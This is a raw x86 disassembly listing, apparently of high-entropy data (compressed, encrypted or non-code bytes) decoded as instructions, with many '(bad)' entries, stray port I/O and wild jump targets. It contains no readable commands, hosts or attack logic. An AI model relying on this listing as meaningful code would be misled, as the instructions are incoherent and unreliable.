  42d6b5:	2c eb                	sub    $0xeb,%al
  42d6b7:	1b 22                	sbb    (%edx),%esp
  42d6b9:	69 1b e2 f7 73 b3    	imul   $0xb373f7e2,(%ebx),%ebx
  42d6bf:	f7 88 84 0d 1d 2a 58 	testl  $0x97eb0658,0x2a1d0d84(%eax)
  42d6c6:	06 eb 97 
  42d6c9:	0e                   	push   %cs
  42d6ca:	67 a5                	movsl  %ds:(%si),%es:(%di)
  42d6cc:	7b 88                	jnp    0x42d656
  42d6ce:	90                   	nop
  42d6cf:	f7 39                	idivl  (%ecx)
  42d6d1:	00 a3 68 1d b4 64    	add    %ah,0x64b41d68(%ebx)
  42d6d7:	8c e4                	mov    %fs,%esp
  42d6d9:	13 f8                	adc    %eax,%edi
  42d6db:	9f                   	lahf
  42d6dc:	54                   	push   %esp
  42d6dd:	6c                   	insb   (%dx),%es:(%edi)
  42d6de:	12 e2                	adc    %dl,%ah
  42d6e0:	58                   	pop    %eax
  42d6e1:	b8 b4 f3 30 58       	mov    $0x5830f3b4,%eax
  42d6e6:	11 77 60             	adc    %esi,0x60(%edi)
  42d6e9:	5c                   	pop    %esp
  42d6ea:	72 f8                	jb     0x42d6e4
  42d6ec:	f7 e8                	imul   %eax
  42d6ee:	4c                   	dec    %esp
  42d6ef:	24 11                	and    $0x11,%al
  42d6f1:	60                   	pusha
  42d6f2:	58                   	pop    %eax
  42d6f3:	da 07                	fiaddl (%edi)
  42d6f5:	6d                   	insl   (%dx),%es:(%edi)
  42d6f6:	3d 02 e1 e0 7e       	cmp    $0x7ee0e102,%eax
  42d6fb:	3b 9d cb 35 fe ac    	cmp    -0x5301ca35(%ebp),%ebx
  42d701:	5f                   	pop    %edi
  42d702:	47                   	inc    %edi
  42d703:	10 dc                	adc    %bl,%ah
  42d705:	eb cc                	jmp    0x42d6d3
  42d707:	66 6f                	outsw  %ds:(%esi),(%dx)
  42d709:	f2 dc f1             	repnz fdiv %st,%st(1)
  42d70c:	07                   	pop    %es
  42d70d:	0d eb 87 3c cc       	or     $0xcc3c87eb,%eax
  42d712:	2c 1b                	sub    $0x1b,%al
  42d714:	b4 ef                	mov    $0xef,%ah
  42d716:	dc f1                	fdiv   %st,%st(1)
  42d718:	1d e7 66 4b 2e       	sbb    $0x2e4b66e7,%eax
  42d71d:	e0 f1                	loopne 0x42d710
  42d71f:	0d 3f 06 74 6f       	or     $0x6f74063f,%eax
  42d724:	59                   	pop    %ecx
  42d725:	e9 eb 7f ec 31       	jmp    0x322f5715
  42d72a:	f8                   	clc
  42d72b:	c1 48 2f 10          	rorl   $0x10,0x2f(%eax)
  42d72f:	b2 ce                	mov    $0xce,%dl
  42d731:	37                   	aaa
  42d732:	3c 4a                	cmp    $0x4a,%al
  42d734:	e9 40 74 28 e4       	jmp    0xe46b4b79
  42d739:	94                   	xchg   %eax,%esp
  42d73a:	3d 65 13 2e 74       	cmp    $0x742e1365,%eax
  42d73f:	14 27                	adc    $0x27,%al
  42d741:	5f                   	pop    %edi
  42d742:	75 58                	jne    0x42d79c
  42d744:	42                   	inc    %edx
  42d745:	2e 24 53             	cs and $0x53,%al
  42d748:	e0 f1                	loopne 0x42d73b
  42d74a:	80 c2 12             	add    $0x12,%dl
  42d74d:	66 0f e9 2c ff       	psubsw (%edi,%edi,8),%xmm5
  42d752:	11 56 10             	adc    %edx,0x10(%esi)
  42d755:	b9 81 db cc fa       	mov    $0xfaccdb81,%ecx
  42d75a:	1e                   	push   %ds
  42d75b:	b4 40                	mov    $0x40,%ah
  42d75d:	9d                   	popf
  42d75e:	b0 f2                	mov    $0xf2,%al
  42d760:	df 7b ee             	fistpll -0x12(%ebx)
  42d763:	05 08 34 06 5c       	add    $0x5c063408,%eax
  42d768:	6a 40                	push   $0x40
  42d76a:	5f                   	pop    %edi
  42d76b:	64 83 d8 04          	fs sbb $0x4,%eax
  42d76f:	39 0f                	cmp    %ecx,(%edi)
  42d771:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42d772:	09 31                	or     %esi,(%ecx)
  42d774:	40                   	inc    %eax
  42d775:	b3 73                	mov    $0x73,%bl
  42d777:	c9                   	leave
  42d778:	85 50 62             	test   %edx,0x62(%eax)
  42d77b:	e4 f1                	in     $0xf1,%al
  42d77d:	f4                   	hlt
  42d77e:	11 5e d9             	adc    %ebx,-0x27(%esi)
  42d781:	97                   	xchg   %eax,%edi
  42d782:	54                   	push   %esp
  42d783:	b0 17                	mov    $0x17,%al
  42d785:	68 f8 17 80 20       	push   $0x208017f8
  42d78a:	06                   	push   %es
  42d78b:	6c                   	insb   (%dx),%es:(%edi)
  42d78c:	98                   	cwtl
  42d78d:	d9 2e                	fldcw  (%esi)
  42d78f:	fc                   	cld
  42d790:	48                   	dec    %eax
  42d791:	2f                   	das
  42d792:	25 d5 ef ca b6       	and    $0xb6caefd5,%eax
  42d797:	da 7e 18             	fidivrl 0x18(%esi)
  42d79a:	40                   	inc    %eax
  42d79b:	6c                   	insb   (%dx),%es:(%edi)
  42d79c:	48                   	dec    %eax
  42d79d:	f2 8e ec             	repnz mov %esp,%gs
  42d7a0:	b9 65 44 24 11       	mov    $0x11244465,%ecx
  42d7a5:	6c                   	insb   (%dx),%es:(%edi)
  42d7a6:	08 bd 92 df ca 17    	or     %bh,0x17cadf92(%ebp)
  42d7ac:	6c                   	insb   (%dx),%es:(%edi)
  42d7ad:	0c 7e                	or     $0x7e,%al
  42d7af:	8b f0                	mov    %eax,%esi
  42d7b1:	6c                   	insb   (%dx),%es:(%edi)
  42d7b2:	c2 3f 92             	ret    $0x923f
  42d7b5:	28 f9                	sub    %bh,%cl
  42d7b7:	8d 44 06 09          	lea    0x9(%esi,%eax,1),%eax
  42d7bb:	0a 16                	or     (%esi),%dl
  42d7bd:	8e 96 7d d8 dd 68    	mov    0x68ddd87d(%esi),%ss
  42d7c3:	10 7e bf             	adc    %bh,-0x41(%esi)
  42d7c6:	5a                   	pop    %edx
  42d7c7:	60                   	pusha
  42d7c8:	fc                   	cld
  42d7c9:	e0 91                	loopne 0x42d75c
  42d7cb:	4c                   	dec    %esp
  42d7cc:	14 e9                	adc    $0xe9,%al
  42d7ce:	d4 91                	aam    $0x91
  42d7d0:	14 7e                	adc    $0x7e,%al
  42d7d2:	56                   	push   %esi
  42d7d3:	36 b2 61             	ss mov $0x61,%dl
  42d7d6:	0a 38                	or     (%eax),%bh
  42d7d8:	82 5c c8 b2 be       	sbbb   $0xbe,-0x4e(%eax,%ecx,8)
  42d7dd:	90                   	nop
  42d7de:	23 03                	and    (%ebx),%eax
  42d7e0:	20 f8                	and    %bh,%al
  42d7e2:	f5                   	cmc
  42d7e3:	3a 68 24             	cmp    0x24(%eax),%ch
  42d7e6:	e4 c0                	in     $0xc0,%al
  42d7e8:	de ca                	fmulp  %st,%st(2)
  42d7ea:	17                   	pop    %ss
  42d7eb:	ed                   	in     (%dx),%eax
  42d7ec:	3a 28                	cmp    (%eax),%ch
  42d7ee:	0f 16 cc             	movlhps %xmm4,%xmm1
  42d7f1:	ad                   	lods   %ds:(%esi),%eax
  42d7f2:	d5 23                	aad    $0x23
  42d7f4:	18 68 2c             	sbb    %ch,0x2c(%eax)
  42d7f7:	7e 9d                	jle    0x42d796
  42d7f9:	c1 6e 59 30          	shrl   $0x30,0x59(%esi)
  42d7fd:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42d7fe:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42d7ff:	f9                   	stc
  42d800:	b2 38                	mov    $0x38,%dl
  42d802:	b6 ac                	mov    $0xac,%dh
  42d804:	79 80                	jns    0x42d786
  42d806:	a2 42 01 44 30       	mov    %al,0x30440142
  42d80b:	90                   	nop
  42d80c:	0c 90                	or     $0x90,%al
  42d80e:	67 5b                	addr16 pop %ebx
  42d810:	1b 26                	sbb    (%esi),%esp
  42d812:	50                   	push   %eax
  42d813:	17                   	pop    %ss
  42d814:	b9 95 35 5f 58       	mov    $0x585f3595,%ecx
  42d819:	17                   	pop    %ss
  42d81a:	89 e7                	mov    %esp,%edi
  42d81c:	23 0f                	and    (%edi),%ecx
  42d81e:	97                   	xchg   %eax,%edi
  42d81f:	3d 13 b6 28 a4       	cmp    $0xa428b613,%eax
  42d824:	60                   	pusha
  42d825:	c8 9b c0 7e          	enter  $0xc09b,$0x7e
  42d829:	21 75 40             	and    %esi,0x40(%ebp)
  42d82c:	68 68 17 28 2f       	push   $0x2f281768
  42d831:	2f                   	das
  42d832:	64 6c                	fs insb (%dx),%es:(%edi)
  42d834:	52                   	push   %edx
  42d835:	b6 cd                	mov    $0xcd,%dh
  42d837:	70 d6                	jo     0x42d80f
  42d839:	f8                   	clc
  42d83a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42d83b:	64 84 09             	test   %cl,%fs:(%ecx)
  42d83e:	75 5b                	jne    0x42d89b
  42d840:	64 80 e4 2a          	fs and $0x2a,%ah
  42d844:	19 42 84             	sbb    %eax,-0x7c(%edx)
  42d847:	88 4c 2e ec          	mov    %cl,-0x14(%esi,%ebp,1)
  42d84b:	00 8c 8d 48 f4 61 a6 	add    %cl,-0x599e0bb8(%ebp,%ecx,4)
  42d852:	6a aa                	push   $0xffffffaa
  42d854:	32 18                	xor    (%eax),%bl
  42d856:	e8 aa 0b 27 cf       	call   0xcf69e405
  42d85b:	c9                   	leave
  42d85c:	5e                   	pop    %esi
  42d85d:	c7                   	(bad)
  42d85e:	15 f8 f5 94 e9       	adc    $0xe994f5f8,%eax
  42d863:	ab                   	stos   %eax,%es:(%edi)
  42d864:	73 06                	jae    0x42d86c
  42d866:	86 f0                	xchg   %dh,%al
  42d868:	8f                   	(bad)
  42d869:	b3 94                	mov    $0x94,%bl
  42d86b:	c5 b3 9c 6d 40 de    	lds    -0x21bf9264(%ebx),%esi
  42d871:	65 13 01             	adc    %gs:(%ecx),%eax
  42d874:	b0 27                	mov    $0x27,%al
  42d876:	4c                   	dec    %esp
  42d877:	74 cf                	je     0x42d848
  42d879:	d7                   	xlat   %ds:(%ebx)
  42d87a:	c3                   	ret
  42d87b:	5b                   	pop    %ebx
  42d87c:	80 8a 35 88 07 22 c1 	orb    $0xc1,0x22078835(%edx)
  42d883:	c6                   	(bad)
  42d884:	08 ca                	or     %cl,%dl
  42d886:	b6 ba                	mov    $0xba,%dh
  42d888:	42                   	inc    %edx
  42d889:	0d 89 f8 a0 f4       	or     $0xf4a0f889,%eax
  42d88e:	c6                   	(bad)
  42d88f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42d890:	27                   	daa
  42d891:	cf                   	iret
  42d892:	c2 30 68             	ret    $0x6830
  42d895:	0a 0c c6             	or     (%esi,%eax,8),%cl
  42d898:	0a e8                	or     %al,%ch
  42d89a:	23 01                	and    (%ecx),%eax
  42d89c:	ef                   	out    %eax,(%dx)
  42d89d:	a3 f1 f5 b8 13       	mov    %eax,0x13b8f5f1
  42d8a2:	b2 94                	mov    $0x94,%dl
  42d8a4:	cd fd                	int    $0xfd
  42d8a6:	35 db 25 06 1d       	xor    $0x1d0625db,%eax
  42d8ab:	d8 56 56             	fcoms  0x56(%esi)
  42d8ae:	ff 35 20 e3 e9 50    	push   0x50e9e320
  42d8b4:	c7 02 cc 0c 61 a0    	movl   $0xa0610ccc,(%edx)
  42d8ba:	d8 de                	fcomp  %st(6)
  42d8bc:	08 35 72 d9 c3 da    	or     %dh,0xdac3d972
  42d8c2:	a2 ec d3 0f b1       	mov    %al,0xb10fd3ec
  42d8c7:	6c                   	insb   (%dx),%es:(%edi)
  42d8c8:	17                   	pop    %ss
  42d8c9:	f8                   	clc
  42d8ca:	d9 dd                	(bad)
  42d8cc:	0e                   	push   %cs
  42d8cd:	74 02                	je     0x42d8d1
  42d8cf:	eb 69                	jmp    0x42d93a
  42d8d1:	20 78 da             	and    %bh,-0x26(%eax)
  42d8d4:	ad                   	lods   %ds:(%esi),%eax
  42d8d5:	a0 93 4c 41 33       	mov    0x33414c93,%al
  42d8da:	07                   	pop    %es
  42d8db:	41                   	inc    %ecx
  42d8dc:	47                   	inc    %edi
  42d8dd:	34 1e                	xor    $0x1e,%al
  42d8df:	e0 bd                	loopne 0x42d89e
  42d8e1:	00 e1                	add    %ah,%cl
  42d8e3:	7e 49                	jle    0x42d92e
  42d8e5:	a1 0f ee 68 85       	mov    0x8568ee0f,%eax
  42d8ea:	b7 83                	mov    $0x83,%bh
  42d8ec:	b5 ca                	mov    $0xca,%ch
  42d8ee:	0c 40                	or     $0x40,%al
  42d8f0:	03 0d 70 75 2e 04    	add    0x42e7570,%ecx
  42d8f6:	62 c1 dc e6 7c       	(bad)
  42d8fb:	da f9                	(bad)
  42d8fd:	1e                   	push   %ds
  42d8fe:	df 48 0c             	fisttps 0xc(%eax)
  42d901:	3f                   	aas
  42d902:	cd c3                	int    $0xc3
  42d904:	ce                   	into
  42d905:	2d 97 e4 e6 20       	sub    $0x20e6e497,%eax
  42d90a:	e9 e5 e8 fb 95       	jmp    0x963ec1f4
  42d90f:	93                   	xchg   %eax,%ebx
  42d910:	d4 2e                	aam    $0x2e
  42d912:	f6 56 bd             	notb   -0x43(%esi)
  42d915:	03 af e8 70 19 0b    	add    0xb1970e8(%edi),%ebp
  42d91b:	78 ae                	js     0x42d8cb
  42d91d:	bb e8 f6 dc 04       	mov    $0x4dcf6e8,%ebx
  42d922:	7c 44                	jl     0x42d968
  42d924:	b1 d8                	mov    $0xd8,%cl
  42d926:	42                   	inc    %edx
  42d927:	01 b9 d1 77 a8 7e    	add    %edi,0x7ea877d1(%ecx)
  42d92d:	1e                   	push   %ds
  42d92e:	f6 30                	divb   (%eax)
  42d930:	0a 76 10             	or     0x10(%esi),%dh
  42d933:	4e                   	dec    %esi
  42d934:	e7 62                	out    %eax,$0x62
  42d936:	e7 63                	out    %eax,$0x63
  42d938:	3c d9                	cmp    $0xd9,%al
  42d93a:	b2 07                	mov    $0x7,%dl
  42d93c:	b5 d9                	mov    $0xd9,%ch
  42d93e:	84 be 0f 8e 01 dd    	test   %bh,-0x22fe71f1(%esi)
  42d944:	70 b1                	jo     0x42d8f7
  42d946:	17                   	pop    %ss
  42d947:	14 16                	adc    $0x16,%al
  42d949:	c1 ff f1             	sar    $0xf1,%edi
  42d94c:	00 32                	add    %dh,(%edx)
  42d94e:	b3 8c                	mov    $0x8c,%bl
  42d950:	8c 0f                	mov    %cs,(%edi)
  42d952:	7d 74                	jge    0x42d9c8
  42d954:	e1 35                	loope  0x42d98b
  42d956:	2e e3 3b             	jecxz,pn 0x42d994
  42d959:	50                   	push   %eax
  42d95a:	b1 5f                	mov    $0x5f,%cl
  42d95c:	fc                   	cld
  42d95d:	41                   	inc    %ecx
  42d95e:	b4 68                	mov    $0x68,%ah
  42d960:	ec                   	in     (%dx),%al
  42d961:	1c 76                	sbb    $0x76,%al
  42d963:	20 fc                	and    %bh,%ah
  42d965:	21 fd                	and    %edi,%ebp
  42d967:	64 9c                	fs pushf
  42d969:	8d                   	lea    (bad),%edi
  42d96a:	fc                   	cld
  42d96b:	24 30                	and    $0x30,%al
  42d96d:	09 b8 ab fc 87 25    	or     %edi,0x2587fcab(%eax)
  42d973:	87 05 2c 45 a4 10    	xchg   %eax,0x10a4452c
  42d979:	f6 b0 25 b7 0c e7    	divb   -0x18f348db(%eax)
  42d97f:	dd 51 ac             	fstl   -0x54(%ecx)
  42d982:	e5 d3                	in     $0xd3,%eax
  42d984:	10 ec                	adc    %ch,%ah
  42d986:	84 07                	test   %al,(%edi)
  42d988:	b1 e4                	mov    $0xe4,%cl
  42d98a:	a1 3f 4c 90 5c       	mov    0x5c904c3f,%eax
  42d98f:	c9                   	leave
  42d990:	80 1f bc             	sbbb   $0xbc,(%edi)
  42d993:	14 7b                	adc    $0x7b,%al
  42d995:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42d996:	1f                   	pop    %ds
  42d997:	e7 42                	out    %eax,$0x42
  42d999:	e6 81                	out    %al,$0x81
  42d99b:	68 6c 53 bc ef       	push   $0xefbc536c
  42d9a0:	fc                   	cld
  42d9a1:	b4 74                	mov    $0x74,%ah
  42d9a3:	9b                   	fwait
  42d9a4:	85 b3 7b 08 f1 74    	test   %esi,0x74f1087b(%ebx)
  42d9aa:	cc                   	int3
  42d9ab:	7e e1                	jle    0x42d98e
  42d9ad:	d4 e0                	aam    $0xe0
  42d9af:	0f c0 9c e2 39 e8 b2 	xadd   %bl,-0x2d4d17c7(%edx,%eiz,8)
  42d9b6:	d2 
  42d9b7:	27                   	daa
  42d9b8:	61                   	popa
  42d9b9:	d6                   	salc
  42d9ba:	9d                   	popf
  42d9bb:	5f                   	pop    %edi
  42d9bc:	78 61                	js     0x42da1f
  42d9be:	17                   	pop    %ss
  42d9bf:	50                   	push   %eax
  42d9c0:	0a 7e d8             	or     -0x28(%esi),%bh
  42d9c3:	b2 4a                	mov    $0x4a,%dl
  42d9c5:	f6 4f 68 d8          	testb  $0xd8,0x68(%edi)
  42d9c9:	7e 4b                	jle    0x42da16
  42d9cb:	8b 25 91 c3 62 f4    	mov    0xf462c391,%esp
  42d9d1:	e8 84 d5 8d 69       	call   0x69d0af5a
  42d9d6:	2d 06 30 b2 16       	sub    $0x16b23006,%eax
  42d9db:	eb 30                	jmp    0x42da0d
  42d9dd:	9f                   	lahf
  42d9de:	51                   	push   %ecx
  42d9df:	4a                   	dec    %edx
  42d9e0:	b6 72                	mov    $0x72,%dh
  42d9e2:	94                   	xchg   %eax,%esp
  42d9e3:	1d e4 36 b2 0b       	sbb    $0xbb236e4,%eax
  42d9e8:	33 1f                	xor    (%edi),%ebx
  42d9ea:	11 ec                	adc    %ebp,%esp
  42d9ec:	23 bd e6 80 3c cd    	and    -0x32c37f1a(%ebp),%edi
  42d9f2:	70 f0                	jo     0x42d9e4
  42d9f4:	f8                   	clc
  42d9f5:	dc a0 f2 43 72 c8    	fsubl  -0x378dbc0e(%eax)
  42d9fb:	f4                   	hlt
  42d9fc:	d1 56 1e             	rcll   $1,0x1e(%esi)
  42d9ff:	7e 44                	jle    0x42da45
  42da01:	68 fc 7b 61 c1       	push   $0xc1617bfc
  42da06:	46                   	inc    %esi
  42da07:	23 70 04             	and    0x4(%eax),%esi
  42da0a:	7f b2                	jg     0x42d9be
  42da0c:	2f                   	das
  42da0d:	7b c9                	jnp    0x42d9d8
  42da0f:	23 dc                	and    %esp,%ebx
  42da11:	a0 08 7f 72 d1       	mov    0xd1727f08,%al
  42da16:	ab                   	stos   %eax,%es:(%edi)
  42da17:	ca d0 9a             	lret   $0x9ad0
  42da1a:	34 81                	xor    $0x81,%al
  42da1c:	39 a4 1a 24 cc 15 fe 	cmp    %esp,-0x1ea33dc(%edx,%ebx,1)
  42da23:	9a 79 8b a0 3d 7b 2d 	lcall  $0x2d7b,$0x3da08b79
  42da2a:	e0 14                	loopne 0x42da40
  42da2c:	0d 3b f0 98 f0       	or     $0xf098f03b,%eax
  42da31:	59                   	pop    %ecx
  42da32:	4a                   	dec    %edx
  42da33:	d8 b2 7f 44 23 e8    	fdivs  -0x17dcbb81(%edx)
  42da39:	40                   	inc    %eax
  42da3a:	d4 36                	aam    $0x36
  42da3c:	c2 86 ec             	ret    $0xec86
  42da3f:	43                   	inc    %ebx
  42da40:	8f                   	(bad)
  42da41:	14 2e                	adc    $0x2e,%al
  42da43:	7f 3e                	jg     0x42da83
  42da45:	4b                   	dec    %ebx
  42da46:	16                   	push   %ss
  42da47:	79 a7                	jns    0x42d9f0
  42da49:	d4 21                	aam    $0x21
  42da4b:	ee                   	out    %al,(%dx)
  42da4c:	03 7e 34             	add    0x34(%esi),%edi
  42da4f:	0d 90 cd 93 50       	or     $0x5093cd90,%eax
  42da54:	20 56 18             	and    %dl,0x18(%esi)
  42da57:	7f 88                	jg     0x42d9e1
  42da59:	10 27                	adc    %ah,(%edi)
  42da5b:	e3 30                	jecxz  0x42da8d
  42da5d:	30 0f                	xor    %cl,(%edi)
  42da5f:	e5 1f                	in     $0x1f,%eax
  42da61:	31 c8                	xor    %ecx,%eax
  42da63:	0f d4 31             	paddq  (%ecx),%mm6
  42da66:	4d                   	dec    %ebp
  42da67:	80 ee 36             	sub    $0x36,%dh
  42da6a:	0b 82 1e 02 2c 27    	or     0x272c021e(%edx),%eax
  42da70:	27                   	daa
  42da71:	9d                   	popf
  42da72:	38 fc                	cmp    %bh,%ah
  42da74:	c0 29 48             	shrb   $0x48,(%ecx)
  42da77:	74 73                	je     0x42daec
  42da79:	fb                   	sti
  42da7a:	d1 66 6c             	shll   $1,0x6c(%esi)
  42da7d:	aa                   	stos   %al,%es:(%edi)
  42da7e:	4b                   	dec    %ebx
  42da7f:	e3 35                	jecxz  0x42dab6
  42da81:	f8                   	clc
  42da82:	ee                   	out    %al,(%dx)
  42da83:	89 cf                	mov    %ecx,%edi
  42da85:	b1 83                	mov    $0x83,%cl
  42da87:	04 ef                	add    $0xef,%al
  42da89:	89 f6                	mov    %esi,%esi
  42da8b:	1c a8                	sbb    $0xa8,%al
  42da8d:	9f                   	lahf
  42da8e:	d7                   	xlat   %ds:(%ebx)
  42da8f:	6c                   	insb   (%dx),%es:(%edi)
  42da90:	94                   	xchg   %eax,%esp
  42da91:	41                   	inc    %ecx
  42da92:	80 5d d0 10          	sbbb   $0x10,-0x30(%ebp)
  42da96:	fc                   	cld
  42da97:	d2 61 0b             	shlb   %cl,0xb(%ecx)
  42da9a:	11 a2 c0 36 56 0b    	adc    %esp,0xb5636c0(%edx)
  42daa0:	da 1e                	ficompl (%esi)
  42daa2:	f8                   	clc
  42daa3:	82 5c a3 60 02       	sbbb   $0x2,0x60(%ebx,%eiz,4)
  42daa8:	35 04 eb 60 7d       	xor    $0x7d60eb04,%eax
  42daad:	c5 c9 cf             	(bad)
  42dab0:	50                   	push   %eax
  42dab1:	d0 e8                	shr    $1,%al
  42dab3:	0c 28                	or     $0x28,%al
  42dab5:	3b 39                	cmp    (%ecx),%edi
  42dab7:	79 96                	jns    0x42da4f
  42dab9:	ca 21 cf             	lret   $0xcf21
  42dabc:	13 12                	adc    (%edx),%edx
  42dabe:	0e                   	push   %cs
  42dabf:	c0 00 da             	rolb   $0xda,(%eax)
  42dac2:	d7                   	xlat   %ds:(%ebx)
  42dac3:	58                   	pop    %eax
  42dac4:	83 3b cb             	cmpl   $0xffffffcb,(%ebx)
  42dac7:	91                   	xchg   %eax,%ecx
  42dac8:	bd c3 e0 c4 2d       	mov    $0x2dc4e0c3,%ebp
  42dacd:	16                   	push   %ss
  42dace:	28 15 33 0b 17 80    	sub    %dl,0x80170b33
  42dad4:	24 55                	and    $0x55,%al
  42dad6:	6a 1a                	push   $0x1a
  42dad8:	24 bf                	and    $0xbf,%al
  42dada:	b0 23                	mov    $0x23,%al
  42dadc:	04 07                	add    $0x7,%al
  42dade:	5d                   	pop    %ebp
  42dadf:	d3 15 d0 07 ee f7    	rcll   %cl,0xf7ee07d0
  42dae5:	5e                   	pop    %esi
  42dae6:	12 de                	adc    %dh,%bl
  42dae8:	4d                   	dec    %ebp
  42dae9:	f9                   	stc
  42daea:	43                   	inc    %ebx
  42daeb:	0b 8c 60 b3 65 e6 b5 	or     -0x4a199a4d(%eax,%eiz,2),%ecx
  42daf2:	e0 27                	loopne 0x42db1b
  42daf4:	40                   	inc    %eax
  42daf5:	1c ce                	sbb    $0xce,%al
  42daf7:	06                   	push   %es
  42daf8:	ff                   	ljmp   (bad)
  42daf9:	e8 a1 14 bd 38       	call   0x38ffef9f
  42dafe:	01 7e 7d             	add    %edi,0x7d(%esi)
  42db01:	ea 57 c4 e4 92 21 7f 	ljmp   $0x7f21,$0x92e4c457
  42db08:	7a 00                	jp     0x42db0a
  42db0a:	05 2c d4 21 32       	add    $0x3221d42c,%eax
  42db0f:	e4 6f                	in     $0x6f,%al
  42db11:	9c                   	pushf
  42db12:	f0 7f a6             	lock jg 0x42dabb
  42db15:	de 8b 06 35 a3 0a    	fimuls 0xaa33506(%ebx)
  42db1b:	3b 08                	cmp    (%eax),%ecx
  42db1d:	7d ec                	jge    0x42db0b
  42db1f:	81 78 ef 33 a1 10 0e 	cmpl   $0xe10a133,-0x11(%eax)
  42db26:	10 13                	adc    %dl,(%ebx)
  42db28:	88 45 0e             	mov    %al,0xe(%ebp)
  42db2b:	73 23                	jae    0x42db50
  42db2d:	3d d6 04 56 28       	cmp    $0x285604d6,%eax
  42db32:	b5 12                	mov    $0x12,%ch
  42db34:	c3                   	ret
  42db35:	14 2d                	adc    $0x2d,%al
  42db37:	d8 47 eb             	fadds  -0x15(%edi)
  42db3a:	b1 6a                	mov    $0x6a,%cl
  42db3c:	0a 11                	or     (%ecx),%dl
  42db3e:	87 3e                	xchg   %edi,(%esi)
  42db40:	00 86 70 58 44 5f    	add    %al,0x5f445870(%esi)
  42db46:	6d                   	insl   (%dx),%es:(%edi)
  42db47:	b1 d9                	mov    $0xd9,%cl
  42db49:	84 72 0f             	test   %dh,0xf(%edx)
  42db4c:	48                   	dec    %eax
  42db4d:	24 9d                	and    $0x9d,%al
  42db4f:	19 b9 16 21 79 0c    	sbb    %edi,0xc792116(%ecx)
  42db55:	a2 69 57 2d 02       	mov    %al,0x22d5769
  42db5a:	34 42                	xor    $0x42,%al
  42db5c:	c6                   	(bad)
  42db5d:	08 39                	or     %bh,(%ecx)
  42db5f:	08 a0 a3 fa 91 18    	or     %ah,0x1891faa3(%eax)
  42db65:	f8                   	clc
  42db66:	81 7d f8 b7 49 36 1b 	cmpl   $0x1b3649b7,-0x8(%ebp)
  42db6d:	f6 c0 9e             	test   $0x9e,%al
  42db70:	ba 60 46 f8 97       	mov    $0x97f84660,%edx
  42db75:	34 43                	xor    $0x43,%al
  42db77:	3e 90                	ds nop
  42db79:	68 c6 13 8f ec       	push   $0xec8f13c6
  42db7e:	eb 3b                	jmp    0x42dbbb
  42db80:	0c db                	or     $0xdb,%al
  42db82:	78 23                	js     0x42dba7
  42db84:	23 05 75 1e 8d 4e    	and    0x4e8d1e75,%eax
  42db8a:	14 c2                	adc    $0xc2,%al
  42db8c:	66 98                	cbtw
  42db8e:	27                   	daa
  42db8f:	bb cc df 2e 50       	mov    $0x502edfcc,%ebx
  42db94:	20 2f                	and    %ch,(%edi)
  42db96:	5b                   	pop    %ebx
  42db97:	96                   	xchg   %eax,%esi
  42db98:	49                   	dec    %ecx
  42db99:	21 eb                	and    %ebp,%ebx
  42db9b:	ac                   	lods   %ds:(%esi),%al
  42db9c:	1d 11 8e 78 81       	sbb    $0x81788e11,%eax
  42dba1:	3d 61 08 74 54       	cmp    $0x54740861,%eax
  42dba6:	cf                   	iret
  42dba7:	7e b3                	jle    0x42db5c
  42dba9:	18 0b                	sbb    %cl,(%ebx)
  42dbab:	32 7c 0c 0b          	xor    0xb(%esp,%ecx,1),%bh
  42dbaf:	30 75 f8             	xor    %dh,-0x8(%ebp)
  42dbb2:	8d 10                	lea    (%eax),%edx
  42dbb4:	2c f8                	sub    $0xf8,%al
  42dbb6:	0d 28 a3 10 eb       	or     $0xeb10a328,%eax
  42dbbb:	cf                   	iret
  42dbbc:	4b                   	dec    %ebx
  42dbbd:	18 c9                	sbb    %cl,%cl
  42dbbf:	49                   	dec    %ecx
  42dbc0:	01 3c a1             	add    %edi,(%ecx,%eiz,4)
  42dbc3:	d4 47                	aam    $0x47
  42dbc5:	0c 30                	or     $0x30,%al
  42dbc7:	c7                   	(bad)
  42dbc8:	e8 c0 71 cd 5f       	call   0x60104d8d
  42dbcd:	aa                   	stos   %al,%es:(%edi)
  42dbce:	11 1d 68 10 00 38    	adc    %ebx,0x38001068
  42dbd4:	e2 28                	loop   0x42dbfe
  42dbd6:	0c d0                	or     $0xd0,%al
  42dbd8:	10 f1                	adc    %dh,%cl
  42dbda:	5b                   	pop    %ebx
  42dbdb:	14 7a                	adc    $0x7a,%al
  42dbdd:	42                   	inc    %edx
  42dbde:	7d e1                	jge    0x42dbc1
  42dbe0:	50                   	push   %eax
  42dbe1:	38 af 7d 10 a3 13    	cmp    %ch,0x13a3107d(%edi)
  42dbe7:	2d 91 7b 5e 13       	sub    $0x135e7b91,%eax
  42dbec:	bd d9 49 00 36       	mov    $0x360049d9,%ebp
  42dbf1:	20 db                	and    %bl,%bl
  42dbf3:	fc                   	cld
  42dbf4:	3b 0c 14             	cmp    (%esp,%edx,1),%ecx
  42dbf7:	3e c2 26 13          	ds ret $0x1326
  42dbfb:	c8 3c 9a 7a          	enter  $0x9a3c,$0x7a
  42dbff:	36 0b 96 ed 24 02 20 	or     %ss:0x200224ed(%esi),%edx
  42dc06:	1c 5c                	sbb    $0x5c,%al
  42dc08:	4a                   	dec    %edx
  42dc09:	87 4c 20 57          	xchg   %ecx,0x57(%eax,%eiz,1)
  42dc0d:	44                   	inc    %esp
  42dc0e:	4f                   	dec    %edi
  42dc0f:	20 40 8e             	and    %al,-0x72(%eax)
  42dc12:	b0 25                	mov    $0x25,%al
  42dc14:	41                   	inc    %ecx
  42dc15:	54                   	push   %esp
  42dc16:	2a 77 0e             	sub    0xe(%edi),%dh
  42dc19:	99                   	cltd
  42dc1a:	0d 14 40 ec 85       	or     $0x85ec4014,%eax
  42dc1f:	a1 68 8a e8 a3       	mov    0xa3e88a68,%eax
  42dc24:	bc 10 b2 77 a4       	mov    $0xa477b210,%esp
  42dc29:	9a 57 67 83 20 05 19 	lcall  $0x1905,$0x20836757
  42dc30:	16                   	push   %ss
  42dc31:	e2 1b                	loop   0x42dc4e
  42dc33:	dd 11                	fstl   (%ecx)
  42dc35:	38 49 0a             	cmp    %cl,0xa(%ecx)
  42dc38:	68 03 40 30 b4       	push   $0xb4304003
  42dc3d:	6f                   	outsl  %ds:(%esi),(%dx)
  42dc3e:	65 cb                	gs lret
